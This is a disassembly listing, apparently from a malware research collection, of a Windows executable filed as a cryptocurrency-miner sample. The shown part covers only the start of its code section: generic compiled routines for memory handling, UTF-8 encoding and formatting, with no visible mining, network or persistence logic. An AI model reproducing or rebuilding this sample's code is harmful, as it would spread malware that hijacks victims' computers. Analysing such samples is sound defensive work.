
malware_samples/miner/0d65a7a087223adece78c09cee5771fb9d7f41e12a174e85d3c29cf846470f07.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	56                   	push   %esi
  401001:	8b 74 24 08          	mov    0x8(%esp),%esi
  401005:	83 7c 24 10 09       	cmpl   $0x9,0x10(%esp)
  40100a:	72 03                	jb     0x40100f
  40100c:	8b 76 fc             	mov    -0x4(%esi),%esi
  40100f:	ff 15 08 30 43 00    	call   *0x433008
  401015:	56                   	push   %esi
  401016:	6a 00                	push   $0x0
  401018:	50                   	push   %eax
  401019:	ff 15 0c 30 43 00    	call   *0x43300c
  40101f:	5e                   	pop    %esi
  401020:	c3                   	ret
  401021:	cc                   	int3
  401022:	cc                   	int3
  401023:	cc                   	int3
  401024:	cc                   	int3
  401025:	cc                   	int3
  401026:	cc                   	int3
  401027:	cc                   	int3
  401028:	cc                   	int3
  401029:	cc                   	int3
  40102a:	cc                   	int3
  40102b:	cc                   	int3
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	55                   	push   %ebp
  401031:	89 e5                	mov    %esp,%ebp
  401033:	8b 45 08             	mov    0x8(%ebp),%eax
  401036:	ff 75 0c             	push   0xc(%ebp)
  401039:	ff 70 08             	push   0x8(%eax)
  40103c:	ff 70 04             	push   0x4(%eax)
  40103f:	e8 2c 21 00 00       	call   0x403170
  401044:	83 c4 0c             	add    $0xc,%esp
  401047:	5d                   	pop    %ebp
  401048:	c3                   	ret
  401049:	cc                   	int3
  40104a:	cc                   	int3
  40104b:	cc                   	int3
  40104c:	cc                   	int3
  40104d:	cc                   	int3
  40104e:	cc                   	int3
  40104f:	cc                   	int3
  401050:	55                   	push   %ebp
  401051:	89 e5                	mov    %esp,%ebp
  401053:	8b 45 08             	mov    0x8(%ebp),%eax
  401056:	ff 70 08             	push   0x8(%eax)
  401059:	ff 70 04             	push   0x4(%eax)
  40105c:	ff 75 0c             	push   0xc(%ebp)
  40105f:	e8 ac 36 00 00       	call   0x404710
  401064:	83 c4 0c             	add    $0xc,%esp
  401067:	5d                   	pop    %ebp
  401068:	c3                   	ret
  401069:	cc                   	int3
  40106a:	cc                   	int3
  40106b:	cc                   	int3
  40106c:	cc                   	int3
  40106d:	cc                   	int3
  40106e:	cc                   	int3
  40106f:	cc                   	int3
  401070:	55                   	push   %ebp
  401071:	89 e5                	mov    %esp,%ebp
  401073:	ff 75 0c             	push   0xc(%ebp)
  401076:	68 ec 33 43 00       	push   $0x4333ec
  40107b:	ff 75 08             	push   0x8(%ebp)
  40107e:	e8 9d 2c 00 00       	call   0x403d20
  401083:	83 c4 0c             	add    $0xc,%esp
  401086:	5d                   	pop    %ebp
  401087:	c3                   	ret
  401088:	cc                   	int3
  401089:	cc                   	int3
  40108a:	cc                   	int3
  40108b:	cc                   	int3
  40108c:	cc                   	int3
  40108d:	cc                   	int3
  40108e:	cc                   	int3
  40108f:	cc                   	int3
  401090:	55                   	push   %ebp
  401091:	89 e5                	mov    %esp,%ebp
  401093:	56                   	push   %esi
  401094:	8b 45 08             	mov    0x8(%ebp),%eax
  401097:	83 38 00             	cmpl   $0x0,(%eax)
  40109a:	74 13                	je     0x4010af
  40109c:	8b 70 04             	mov    0x4(%eax),%esi
  40109f:	ff 15 08 30 43 00    	call   *0x433008
  4010a5:	56                   	push   %esi
  4010a6:	6a 00                	push   $0x0
  4010a8:	50                   	push   %eax
  4010a9:	ff 15 0c 30 43 00    	call   *0x43300c
  4010af:	5e                   	pop    %esi
  4010b0:	5d                   	pop    %ebp
  4010b1:	c3                   	ret
  4010b2:	cc                   	int3
  4010b3:	cc                   	int3
  4010b4:	cc                   	int3
  4010b5:	cc                   	int3
  4010b6:	cc                   	int3
  4010b7:	cc                   	int3
  4010b8:	cc                   	int3
  4010b9:	cc                   	int3
  4010ba:	cc                   	int3
  4010bb:	cc                   	int3
  4010bc:	cc                   	int3
  4010bd:	cc                   	int3
  4010be:	cc                   	int3
  4010bf:	cc                   	int3
  4010c0:	55                   	push   %ebp
  4010c1:	89 e5                	mov    %esp,%ebp
  4010c3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4010c6:	8b 48 04             	mov    0x4(%eax),%ecx
  4010c9:	6a 05                	push   $0x5
  4010cb:	68 9c 32 43 00       	push   $0x43329c
  4010d0:	ff 30                	push   (%eax)
  4010d2:	ff 51 0c             	call   *0xc(%ecx)
  4010d5:	83 c4 0c             	add    $0xc,%esp
  4010d8:	5d                   	pop    %ebp
  4010d9:	c3                   	ret
  4010da:	cc                   	int3
  4010db:	cc                   	int3
  4010dc:	cc                   	int3
  4010dd:	cc                   	int3
  4010de:	cc                   	int3
  4010df:	cc                   	int3
  4010e0:	55                   	push   %ebp
  4010e1:	89 e5                	mov    %esp,%ebp
  4010e3:	53                   	push   %ebx
  4010e4:	57                   	push   %edi
  4010e5:	56                   	push   %esi
  4010e6:	83 ec 10             	sub    $0x10,%esp
  4010e9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4010ec:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4010ef:	be 01 00 00 00       	mov    $0x1,%esi
  4010f4:	8b 51 08             	mov    0x8(%ecx),%edx
  4010f7:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
  4010fd:	72 1b                	jb     0x40111a
  4010ff:	be 02 00 00 00       	mov    $0x2,%esi
  401104:	81 fb 00 08 00 00    	cmp    $0x800,%ebx
  40110a:	72 0e                	jb     0x40111a
  40110c:	81 fb 00 00 01 00    	cmp    $0x10000,%ebx
  401112:	be 04 00 00 00       	mov    $0x4,%esi
  401117:	83 de 00             	sbb    $0x0,%esi
  40111a:	8b 01                	mov    (%ecx),%eax
  40111c:	29 d0                	sub    %edx,%eax
  40111e:	39 c6                	cmp    %eax,%esi
  401120:	89 d0                	mov    %edx,%eax
  401122:	0f 87 a5 00 00 00    	ja     0x4011cd
  401128:	8b 79 04             	mov    0x4(%ecx),%edi
  40112b:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
  401131:	73 08                	jae    0x40113b
  401133:	88 1c 07             	mov    %bl,(%edi,%eax,1)
  401136:	e9 83 00 00 00       	jmp    0x4011be
  40113b:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40113e:	89 da                	mov    %ebx,%edx
  401140:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401143:	89 d8                	mov    %ebx,%eax
  401145:	80 e2 3f             	and    $0x3f,%dl
  401148:	c1 e8 06             	shr    $0x6,%eax
  40114b:	80 ca 80             	or     $0x80,%dl
  40114e:	81 fb 00 08 00 00    	cmp    $0x800,%ebx
  401154:	73 0e                	jae    0x401164
  401156:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  401159:	0c c0                	or     $0xc0,%al
  40115b:	88 04 1f             	mov    %al,(%edi,%ebx,1)
  40115e:	88 54 1f 01          	mov    %dl,0x1(%edi,%ebx,1)
  401162:	eb 57                	jmp    0x4011bb
  401164:	24 3f                	and    $0x3f,%al
  401166:	89 d9                	mov    %ebx,%ecx
  401168:	0c 80                	or     $0x80,%al
  40116a:	c1 e9 0c             	shr    $0xc,%ecx
  40116d:	81 fb ff ff 00 00    	cmp    $0xffff,%ebx
  401173:	77 13                	ja     0x401188
  401175:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  401178:	80 c9 e0             	or     $0xe0,%cl
  40117b:	88 0c 1f             	mov    %cl,(%edi,%ebx,1)
  40117e:	88 44 1f 01          	mov    %al,0x1(%edi,%ebx,1)
  401182:	88 54 1f 02          	mov    %dl,0x2(%edi,%ebx,1)
  401186:	eb 30                	jmp    0x4011b8
  401188:	89 7d e8             	mov    %edi,-0x18(%ebp)
  40118b:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40118e:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401191:	c1 eb 12             	shr    $0x12,%ebx
  401194:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401197:	80 cb f0             	or     $0xf0,%bl
  40119a:	88 1c 39             	mov    %bl,(%ecx,%edi,1)
  40119d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4011a0:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  4011a3:	8b 7d e8             	mov    -0x18(%ebp),%edi
  4011a6:	80 e1 3f             	and    $0x3f,%cl
  4011a9:	80 c9 80             	or     $0x80,%cl
  4011ac:	88 4c 1f 01          	mov    %cl,0x1(%edi,%ebx,1)
  4011b0:	88 44 1f 02          	mov    %al,0x2(%edi,%ebx,1)
  4011b4:	88 54 1f 03          	mov    %dl,0x3(%edi,%ebx,1)
  4011b8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4011bb:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4011be:	01 d6                	add    %edx,%esi
  4011c0:	31 c0                	xor    %eax,%eax
  4011c2:	89 71 08             	mov    %esi,0x8(%ecx)
  4011c5:	83 c4 10             	add    $0x10,%esp
  4011c8:	5e                   	pop    %esi
  4011c9:	5f                   	pop    %edi
  4011ca:	5b                   	pop    %ebx
  4011cb:	5d                   	pop    %ebp
  4011cc:	c3                   	ret
  4011cd:	89 d7                	mov    %edx,%edi
  4011cf:	56                   	push   %esi
  4011d0:	e8 db 03 03 00       	call   0x4315b0
  4011d5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4011d8:	89 fa                	mov    %edi,%edx
  4011da:	83 c4 04             	add    $0x4,%esp
  4011dd:	8b 41 08             	mov    0x8(%ecx),%eax
  4011e0:	e9 43 ff ff ff       	jmp    0x401128
  4011e5:	cc                   	int3
  4011e6:	cc                   	int3
  4011e7:	cc                   	int3
  4011e8:	cc                   	int3
  4011e9:	cc                   	int3
  4011ea:	cc                   	int3
  4011eb:	cc                   	int3
  4011ec:	cc                   	int3
  4011ed:	cc                   	int3
  4011ee:	cc                   	int3
  4011ef:	cc                   	int3
  4011f0:	55                   	push   %ebp
  4011f1:	89 e5                	mov    %esp,%ebp
  4011f3:	53                   	push   %ebx
  4011f4:	57                   	push   %edi
  4011f5:	56                   	push   %esi
  4011f6:	8b 75 08             	mov    0x8(%ebp),%esi
  4011f9:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4011fc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4011ff:	8b 06                	mov    (%esi),%eax
  401201:	8b 7e 08             	mov    0x8(%esi),%edi
  401204:	29 f8                	sub    %edi,%eax
  401206:	39 c3                	cmp    %eax,%ebx
  401208:	77 1c                	ja     0x401226
  40120a:	8b 46 04             	mov    0x4(%esi),%eax
  40120d:	01 f8                	add    %edi,%eax
  40120f:	53                   	push   %ebx
  401210:	51                   	push   %ecx
  401211:	50                   	push   %eax
  401212:	e8 f9 20 02 00       	call   0x423310
  401217:	83 c4 0c             	add    $0xc,%esp
  40121a:	01 df                	add    %ebx,%edi
  40121c:	31 c0                	xor    %eax,%eax
  40121e:	89 7e 08             	mov    %edi,0x8(%esi)
  401221:	5e                   	pop    %esi
  401222:	5f                   	pop    %edi
  401223:	5b                   	pop    %ebx
  401224:	5d                   	pop    %ebp
  401225:	c3                   	ret
  401226:	89 f1                	mov    %esi,%ecx
  401228:	89 fa                	mov    %edi,%edx
  40122a:	53                   	push   %ebx
  40122b:	e8 80 03 03 00       	call   0x4315b0
  401230:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401233:	83 c4 04             	add    $0x4,%esp
  401236:	8b 7e 08             	mov    0x8(%esi),%edi
  401239:	eb cf                	jmp    0x40120a
  40123b:	cc                   	int3
  40123c:	cc                   	int3
  40123d:	cc                   	int3
  40123e:	cc                   	int3
  40123f:	cc                   	int3
  401240:	55                   	push   %ebp
  401241:	89 e5                	mov    %esp,%ebp
  401243:	53                   	push   %ebx
  401244:	57                   	push   %edi
  401245:	56                   	push   %esi
  401246:	83 ec 30             	sub    $0x30,%esp
  401249:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  40124c:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  401253:	c7 45 ec 00 31 40 00 	movl   $0x403100,-0x14(%ebp)
  40125a:	8b 45 08             	mov    0x8(%ebp),%eax
  40125d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401260:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  401267:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40126a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401271:	8b 38                	mov    (%eax),%edi
  401273:	8b 58 08             	mov    0x8(%eax),%ebx
  401276:	39 df                	cmp    %ebx,%edi
  401278:	74 5b                	je     0x4012d5
  40127a:	8b 40 04             	mov    0x4(%eax),%eax
  40127d:	8d 73 01             	lea    0x1(%ebx),%esi
  401280:	39 f7                	cmp    %esi,%edi
  401282:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  401286:	76 72                	jbe    0x4012fa
  401288:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40128b:	ff 15 08 30 43 00    	call   *0x433008
  401291:	85 f6                	test   %esi,%esi
  401293:	74 2b                	je     0x4012c0
  401295:	56                   	push   %esi
  401296:	ff 75 e0             	push   -0x20(%ebp)
  401299:	6a 00                	push   $0x0
  40129b:	50                   	push   %eax
  40129c:	ff 15 10 30 43 00    	call   *0x433010
  4012a2:	85 c0                	test   %eax,%eax
  4012a4:	75 54                	jne    0x4012fa
  4012a6:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4012a9:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4012ac:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4012b3:	56                   	push   %esi
  4012b4:	6a 01                	push   $0x1
  4012b6:	e8 c3 01 03 00       	call   0x43147e
  4012bb:	83 c4 08             	add    $0x8,%esp
  4012be:	eb 6e                	jmp    0x40132e
  4012c0:	ff 75 e0             	push   -0x20(%ebp)
  4012c3:	6a 00                	push   $0x0
  4012c5:	50                   	push   %eax
  4012c6:	ff 15 0c 30 43 00    	call   *0x43300c
  4012cc:	b8 01 00 00 00       	mov    $0x1,%eax
  4012d1:	31 f6                	xor    %esi,%esi
  4012d3:	eb 25                	jmp    0x4012fa
  4012d5:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4012d8:	8b 78 04             	mov    0x4(%eax),%edi
  4012db:	8d 73 01             	lea    0x1(%ebx),%esi
  4012de:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4012e1:	89 da                	mov    %ebx,%edx
  4012e3:	56                   	push   %esi
  4012e4:	57                   	push   %edi
  4012e5:	e8 46 02 03 00       	call   0x431530
  4012ea:	83 c4 08             	add    $0x8,%esp
  4012ed:	83 7d c4 01          	cmpl   $0x1,-0x3c(%ebp)
  4012f1:	74 1b                	je     0x40130e
  4012f3:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4012f6:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  4012fa:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4012fd:	89 f2                	mov    %esi,%edx
  4012ff:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401306:	83 c4 30             	add    $0x30,%esp
  401309:	5e                   	pop    %esi
  40130a:	5f                   	pop    %edi
  40130b:	5b                   	pop    %ebx
  40130c:	5d                   	pop    %ebp
  40130d:	c3                   	ret
  40130e:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401311:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401314:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  401317:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40131a:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  40131d:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401324:	51                   	push   %ecx
  401325:	50                   	push   %eax
  401326:	e8 53 01 03 00       	call   0x43147e
  40132b:	83 c4 08             	add    $0x8,%esp
  40132e:	0f 0b                	ud2
  401330:	55                   	push   %ebp
  401331:	83 ec 10             	sub    $0x10,%esp
  401334:	83 c5 0c             	add    $0xc,%ebp
  401337:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40133a:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  40133d:	75 19                	jne    0x401358
  40133f:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  401343:	74 13                	je     0x401358
  401345:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  401348:	ff 15 08 30 43 00    	call   *0x433008
  40134e:	56                   	push   %esi
  40134f:	6a 00                	push   $0x0
  401351:	50                   	push   %eax
  401352:	ff 15 0c 30 43 00    	call   *0x43300c
  401358:	83 c4 10             	add    $0x10,%esp
  40135b:	5d                   	pop    %ebp
  40135c:	c3                   	ret
  40135d:	0f 1f 00             	nopl   (%eax)
  401360:	55                   	push   %ebp
  401361:	83 ec 10             	sub    $0x10,%esp
  401364:	83 c5 0c             	add    $0xc,%ebp
  401367:	ff 15 08 30 43 00    	call   *0x433008
  40136d:	8b 75 e0             	mov    -0x20(%ebp),%esi
  401370:	56                   	push   %esi
  401371:	6a 00                	push   $0x0
  401373:	50                   	push   %eax
  401374:	ff 15 0c 30 43 00    	call   *0x43300c
  40137a:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40137d:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  401384:	83 c4 10             	add    $0x10,%esp
  401387:	5d                   	pop    %ebp
  401388:	c3                   	ret
  401389:	cc                   	int3
  40138a:	cc                   	int3
  40138b:	cc                   	int3
  40138c:	cc                   	int3
  40138d:	cc                   	int3
  40138e:	cc                   	int3
  40138f:	cc                   	int3
  401390:	55                   	push   %ebp
  401391:	89 e5                	mov    %esp,%ebp
  401393:	53                   	push   %ebx
  401394:	57                   	push   %edi
  401395:	56                   	push   %esi
  401396:	83 ec 34             	sub    $0x34,%esp
  401399:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  40139c:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4013a3:	c7 45 ec 10 31 40 00 	movl   $0x403110,-0x14(%ebp)
  4013aa:	8b 75 0c             	mov    0xc(%ebp),%esi
  4013ad:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4013b0:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  4013b7:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4013ba:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4013c0:	8b 4e 04             	mov    0x4(%esi),%ecx
  4013c3:	85 c9                	test   %ecx,%ecx
  4013c5:	0f 84 ce 00 00 00    	je     0x401499
  4013cb:	8b 06                	mov    (%esi),%eax
  4013cd:	31 d2                	xor    %edx,%edx
  4013cf:	83 f9 08             	cmp    $0x8,%ecx
  4013d2:	bf 00 00 00 00       	mov    $0x0,%edi
  4013d7:	0f 82 80 00 00 00    	jb     0x40145d
  4013dd:	89 ca                	mov    %ecx,%edx
  4013df:	8d 78 3c             	lea    0x3c(%eax),%edi
  4013e2:	66 0f ef c0          	pxor   %xmm0,%xmm0
  4013e6:	66 0f ef c9          	pxor   %xmm1,%xmm1
  4013ea:	83 e2 f8             	and    $0xfffffff8,%edx
  4013ed:	89 d3                	mov    %edx,%ebx
  4013ef:	90                   	nop
  4013f0:	66 0f 6e 57 e0       	movd   -0x20(%edi),%xmm2
  4013f5:	66 0f 6e 5f d8       	movd   -0x28(%edi),%xmm3
  4013fa:	66 0f 6e 67 c8       	movd   -0x38(%edi),%xmm4
  4013ff:	66 0f 6e 77 f8       	movd   -0x8(%edi),%xmm6
  401404:	66 0f 6e 6f f0       	movd   -0x10(%edi),%xmm5
  401409:	66 0f 62 da          	punpckldq %xmm2,%xmm3
  40140d:	66 0f 6e 57 d0       	movd   -0x30(%edi),%xmm2
  401412:	66 0f 62 e2          	punpckldq %xmm2,%xmm4
  401416:	66 0f 6e 17          	movd   (%edi),%xmm2
  40141a:	66 0f 6c e3          	punpcklqdq %xmm3,%xmm4
  40141e:	66 0f fe c4          	paddd  %xmm4,%xmm0
  401422:	66 0f 6e 67 e8       	movd   -0x18(%edi),%xmm4
  401427:	83 c7 40             	add    $0x40,%edi
  40142a:	83 c3 f8             	add    $0xfffffff8,%ebx
  40142d:	66 0f 62 f2          	punpckldq %xmm2,%xmm6
  401431:	66 0f 62 e5          	punpckldq %xmm5,%xmm4
  401435:	66 0f 6c e6          	punpcklqdq %xmm6,%xmm4
  401439:	66 0f fe cc          	paddd  %xmm4,%xmm1
  40143d:	75 b1                	jne    0x4013f0
  40143f:	66 0f fe c8          	paddd  %xmm0,%xmm1
  401443:	39 d1                	cmp    %edx,%ecx
  401445:	66 0f 70 c1 ee       	pshufd $0xee,%xmm1,%xmm0
  40144a:	66 0f fe c1          	paddd  %xmm1,%xmm0
  40144e:	66 0f 70 c8 55       	pshufd $0x55,%xmm0,%xmm1
  401453:	66 0f fe c8          	paddd  %xmm0,%xmm1
  401457:	66 0f 7e cf          	movd   %xmm1,%edi
  40145b:	74 1b                	je     0x401478
  40145d:	29 d1                	sub    %edx,%ecx
  40145f:	8d 54 d0 04          	lea    0x4(%eax,%edx,8),%edx
  401463:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  40146a:	00 00 00 
  40146d:	0f 1f 00             	nopl   (%eax)
  401470:	03 3a                	add    (%edx),%edi
  401472:	83 c2 08             	add    $0x8,%edx
  401475:	49                   	dec    %ecx
  401476:	75 f8                	jne    0x401470
  401478:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  40147c:	74 2e                	je     0x4014ac
  40147e:	83 ff 0f             	cmp    $0xf,%edi
  401481:	77 1e                	ja     0x4014a1
  401483:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  401487:	75 18                	jne    0x4014a1
  401489:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401490:	b8 01 00 00 00       	mov    $0x1,%eax
  401495:	31 ff                	xor    %edi,%edi
  401497:	eb 4f                	jmp    0x4014e8
  401499:	31 ff                	xor    %edi,%edi
  40149b:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  40149f:	74 e8                	je     0x401489
  4014a1:	31 c0                	xor    %eax,%eax
  4014a3:	85 ff                	test   %edi,%edi
  4014a5:	0f 4f c7             	cmovg  %edi,%eax
  4014a8:	01 c0                	add    %eax,%eax
  4014aa:	89 c7                	mov    %eax,%edi
  4014ac:	31 c0                	xor    %eax,%eax
  4014ae:	85 ff                	test   %edi,%edi
  4014b0:	79 0e                	jns    0x4014c0
  4014b2:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4014b9:	57                   	push   %edi
  4014ba:	50                   	push   %eax
  4014bb:	e8 be ff 02 00       	call   0x43147e
  4014c0:	74 ce                	je     0x401490
  4014c2:	83 ec 0c             	sub    $0xc,%esp
  4014c5:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4014c9:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4014d0:	00 
  4014d1:	e8 ea 86 01 00       	call   0x419bc0
  4014d6:	83 c4 0c             	add    $0xc,%esp
  4014d9:	85 c0                	test   %eax,%eax
  4014db:	0f 84 94 00 00 00    	je     0x401575
  4014e1:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4014e8:	f2 0f 10 46 10       	movsd  0x10(%esi),%xmm0
  4014ed:	f2 0f 10 16          	movsd  (%esi),%xmm2
  4014f1:	f2 0f 10 4e 08       	movsd  0x8(%esi),%xmm1
  4014f6:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4014f9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4014fc:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4014ff:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401502:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  401509:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401510:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%ebp)
  401515:	f2 0f 11 4d c8       	movsd  %xmm1,-0x38(%ebp)
  40151a:	f2 0f 11 55 c0       	movsd  %xmm2,-0x40(%ebp)
  40151f:	51                   	push   %ecx
  401520:	68 ec 33 43 00       	push   $0x4333ec
  401525:	50                   	push   %eax
  401526:	e8 f5 27 00 00       	call   0x403d20
  40152b:	83 c4 0c             	add    $0xc,%esp
  40152e:	84 c0                	test   %al,%al
  401530:	75 24                	jne    0x401556
  401532:	8b 45 08             	mov    0x8(%ebp),%eax
  401535:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401538:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  40153d:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401540:	89 48 08             	mov    %ecx,0x8(%eax)
  401543:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  401547:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  40154e:	83 c4 34             	add    $0x34,%esp
  401551:	5e                   	pop    %esi
  401552:	5f                   	pop    %edi
  401553:	5b                   	pop    %ebx
  401554:	5d                   	pop    %ebp
  401555:	c3                   	ret
  401556:	68 10 33 43 00       	push   $0x433310
  40155b:	68 8c 32 43 00       	push   $0x43328c
  401560:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401563:	50                   	push   %eax
  401564:	6a 56                	push   $0x56
  401566:	68 a1 32 43 00       	push   $0x4332a1
  40156b:	e8 c0 02 03 00       	call   0x431830
  401570:	83 c4 14             	add    $0x14,%esp
  401573:	0f 0b                	ud2
  401575:	b8 01 00 00 00       	mov    $0x1,%eax
  40157a:	e9 33 ff ff ff       	jmp    0x4014b2
  40157f:	90                   	nop
  401580:	55                   	push   %ebp
  401581:	83 ec 14             	sub    $0x14,%esp
  401584:	83 c5 0c             	add    $0xc,%ebp
  401587:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40158b:	74 13                	je     0x4015a0
  40158d:	8b 75 dc             	mov    -0x24(%ebp),%esi
  401590:	ff 15 08 30 43 00    	call   *0x433008
  401596:	56                   	push   %esi
  401597:	6a 00                	push   $0x0
  401599:	50                   	push   %eax
  40159a:	ff 15 0c 30 43 00    	call   *0x43300c
  4015a0:	83 c4 14             	add    $0x14,%esp
  4015a3:	5d                   	pop    %ebp
  4015a4:	c3                   	ret
  4015a5:	cc                   	int3
  4015a6:	cc                   	int3
  4015a7:	cc                   	int3
  4015a8:	cc                   	int3
  4015a9:	cc                   	int3
  4015aa:	cc                   	int3
  4015ab:	cc                   	int3
  4015ac:	cc                   	int3
  4015ad:	cc                   	int3
  4015ae:	cc                   	int3
  4015af:	cc                   	int3
  4015b0:	55                   	push   %ebp
  4015b1:	89 e5                	mov    %esp,%ebp
  4015b3:	53                   	push   %ebx
  4015b4:	57                   	push   %edi
  4015b5:	56                   	push   %esi
  4015b6:	83 ec 58             	sub    $0x58,%esp
  4015b9:	89 65 e4             	mov    %esp,-0x1c(%ebp)
  4015bc:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4015c3:	c7 45 ec 20 31 40 00 	movl   $0x403120,-0x14(%ebp)
  4015ca:	8b 7d 10             	mov    0x10(%ebp),%edi
  4015cd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4015d0:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  4015d7:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4015da:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4015e0:	31 c0                	xor    %eax,%eax
  4015e2:	85 ff                	test   %edi,%edi
  4015e4:	79 07                	jns    0x4015ed
  4015e6:	57                   	push   %edi
  4015e7:	50                   	push   %eax
  4015e8:	e8 91 fe 02 00       	call   0x43147e
  4015ed:	8b 75 0c             	mov    0xc(%ebp),%esi
  4015f0:	85 ff                	test   %edi,%edi
  4015f2:	0f 84 c6 02 00 00    	je     0x4018be
  4015f8:	83 ec 0c             	sub    $0xc,%esp
  4015fb:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4015ff:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401606:	00 
  401607:	e8 b4 85 01 00       	call   0x419bc0
  40160c:	83 c4 0c             	add    $0xc,%esp
  40160f:	85 c0                	test   %eax,%eax
  401611:	0f 84 03 0e 00 00    	je     0x40241a
  401617:	89 c1                	mov    %eax,%ecx
  401619:	31 c0                	xor    %eax,%eax
  40161b:	83 ff 10             	cmp    $0x10,%edi
  40161e:	89 fa                	mov    %edi,%edx
  401620:	89 f3                	mov    %esi,%ebx
  401622:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401625:	0f 82 ab 02 00 00    	jb     0x4018d6
  40162b:	89 f8                	mov    %edi,%eax
  40162d:	89 7d b8             	mov    %edi,-0x48(%ebp)
  401630:	8b 7d e0             	mov    -0x20(%ebp),%edi
  401633:	25 f0 ff ff 7f       	and    $0x7ffffff0,%eax
  401638:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40163b:	31 c0                	xor    %eax,%eax
  40163d:	0f 1f 00             	nopl   (%eax)
  401640:	8a 34 06             	mov    (%esi,%eax,1),%dh
  401643:	8a 54 06 01          	mov    0x1(%esi,%eax,1),%dl
  401647:	8a 7c 06 02          	mov    0x2(%esi,%eax,1),%bh
  40164b:	8a 5c 06 03          	mov    0x3(%esi,%eax,1),%bl
  40164f:	88 f5                	mov    %dh,%ch
  401651:	88 d1                	mov    %dl,%cl
  401653:	88 5d b6             	mov    %bl,-0x4a(%ebp)
  401656:	f6 d3                	not    %bl
  401658:	f6 d5                	not    %ch
  40165a:	f6 d1                	not    %cl
  40165c:	c0 eb 07             	shr    $0x7,%bl
